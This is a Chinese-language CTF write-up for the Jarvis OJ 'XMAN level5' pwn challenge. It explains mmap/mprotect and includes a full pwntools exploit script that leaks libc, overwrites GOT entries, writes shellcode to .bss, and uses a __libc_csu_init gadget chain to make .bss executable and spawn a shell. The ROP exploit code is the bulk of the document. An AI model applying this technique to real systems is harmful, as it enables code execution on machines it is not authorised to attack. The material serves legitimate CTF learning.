# [XMAN]level5

从上周六开始看的一道题，很抱歉鸽了几天，我实在是太菜了

## 分析：

这道题本来难度并不大，文件与level3_x64相同，但是这题的要求是假设``system``函数和``execve``函数被禁用，用``mmap()``和``mprotect()``函数完成

### mmap

```c
void *mmap( void *start , size_t length , int prot , int flags , int fd , off_t offsize)
```

参数start：

- 指向欲映像的内存起始地址，通常设为NULL，代表让系统自动标明地址，映像成功后返回该地址。

参数length：

- 代表将文件中多大的部分映像到内存。

参数prot：映像区域的保护方式。可以为以下几种方式的组合：

- PROT_EXEC映像区域可被执行
- PROT_READ映像区域可被读取
- PROT_WRITE映像区域可被写入
- PROT_NONE映像区域不能存取

参数flags：影响映像区域的各种特性。在调用mmap（）时必须要指定MAP_SHARED或MAP_PRIVATE。

- MAP_FIXED：如果参数start所指的地址无法成功建立映像时，则放弃映像，不对地址做修正。通常不鼓励用此旗标。
- MAP_SHARED：对映像区域的写入数据会复制回文件内，而且允许其他映像该文件的进程共享，原来的文件会改变。
- MAP_PRIVATE：对映像区域的写入操作会产生一个映像文件的复制，即私人的“写入时复制”（copy on write）对此区域作的任何修改都不会写回原来的文件内容。当共享的对象的虚拟存储区域为私有对象时，修改只会被本进程中改变。*（学的操作系统终于派上用场了）*
- MAP_ANONYMOUS：建立匿名映像。此时会忽略参数fd，不涉及文件，而且映像区域无法和其他进程共享。
- MAP_DENYWRITE：只允许对映像区域的写入操作，其他对文件直接写入的操作将会被拒绝。
- MAP_LOCKED：将映像区域锁定住，这表示该区域不会被置换（swap）。
  参数fd：
- 要映像到内存中的文件描述符。如果使用匿名内存映像时，即flags中设置了MAP_ANONYMOUS，fd设为-1。有些系统不支持匿名内存映像，则可以使用fopen打开/dev/zero文件，然后对该文件进行映像，可以同样达到匿名内存映像的效果。
  参数offset：
- 文件映像的偏移量，通常设置为0，代表从文件最前方开始对应，offset必须是分页大小的整数倍。

返回值：

- 若映像成功则返回映像区的内存起始地址，否则返回MAP_FAILED（－1），错误原因存于errno中。

### mprotect

```c
int mprotect(const void *start, size_t len, int prot);
```

在Linux中，``mprotect()``函数可以用来修改一段指定内存区域的保护属性。
``mprotect()``函数把自start开始的、长度为len的内存区的保护属性修改为prot指定的值,就是常见的0x111对应执行，写，读权限

``mmap()``的参数过多，跟着网上的wp用``mprotect()``完成了这一题

``mprotect()``有三个参数，这里需要使用到``__libc_csu_init``结尾的``gadget``来进行传参

## 思路：

首先与level3_x64相同，通过泄露libc地址得到``mprotect()``的地址

接着将``mprotect()``和bss段写入got表中

然后把shellcode写入bss段

最后调用``mprotect()``函数，修改bss段的权限并返回到bss段运行shellcode

### 问题：

一开始准备使用got表中数值为0的地址，失败多次之后改用``__libc_start_main``的got表位

另外，不知道为什么要用pause()，好像是要维持线程

还有，这题的shellcode需要调整参数，一开始没有注意到一直出错

## exp:

```python
from pwn import *

context(log_level = 'debug',os = 'linux',arch = 'amd64')

#n = process('./level5')
n = remote('pwn2.jarvisoj.com', 9884)
#n = remote("localhost",12345)

elf = ELF('./level5')
#libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
libc = ELF('./libc-2.19.so')

offset = 0x88

read_got = elf.got['read']
read_plt = elf.symbols['read']
write_plt = elf.symbols['write']
main_addr = elf.symbols['main']
bss_addr = elf.bss()
shellcode = asm(shellcraft.amd64.sh())

pop_rdi_ret_addr = 0x00000000004006b3
pop_rsi_pop_r15_ret_addr = 0x00000000004006b1

payload1 = 'a' * offset + p64(pop_rdi_ret_addr) + p64(1) + p64(pop_rsi_pop_r15_ret_addr) +  p64(read_got) + 'deadbuff' + p64(write_plt) + p64(main_addr)

n.recvuntil("Input:\n")
n.send(payload1)
sleep(0.2)
pause()
read_addr = u64(n.recv(8))

libc.address = read_addr - libc.symbols['read']

mprotect_addr = libc.symbols['mprotect']
print 'mprotect_addr = ' + hex(mprotect_addr)

#write the mprotect to got table
libc_start_main_got = elf.got['__libc_start_main']
payload2 = 'a' * offset + p64(pop_rdi_ret_addr) + p64(0) + p64(pop_rsi_pop_r15_ret_addr) + p64(libc_start_main_got) + 'deadbuff' + p64(read_plt) + p64(main_addr)

n.send(payload2)
sleep(0.2)
n.send(p64(mprotect_addr))
sleep(0.2)
pause()

#write the shellcode to bss
payload3 = 'a' * offset + p64(pop_rdi_ret_addr) + p64(0) + p64(pop_rsi_pop_r15_ret_addr) + p64(bss_addr) + 'deadbuff' + p64(read_plt) + p64(main_addr)

n.send(payload3)
sleep(0.2)
n.send(shellcode)
sleep(0.2)
pause()

#write the bss to got table
gmon_start_got = elf.got['__gmon_start__']
payload4 = 'a' * offset + p64(pop_rdi_ret_addr) + p64(0) + p64(pop_rsi_pop_r15_ret_addr) + p64(gmon_start_got) + 'deadbuff' + p64(read_plt) + p64(main_addr)

n.send(payload4)
sleep(0.2)
n.send(p64(bss_addr))
sleep(0.2)
pause()

csu_start = 0x4006AA
csu_end = 0x400690

payload5 = 'a' * offset + p64(csu_start) + p64(0) + p64(1) + p64(libc_start_main_got) + p64(7) + p64(0x1000) + p64(0x600000) + p64(csu_end)
payload5 += 'deadbuff' + p64(0) + p64(1) + p64(gmon_start_got) + p64(0) +p64(0) + p64(0) + p64(csu_end)
n.send(payload5)
sleep(0.2)
pause()

n.interactive()
```

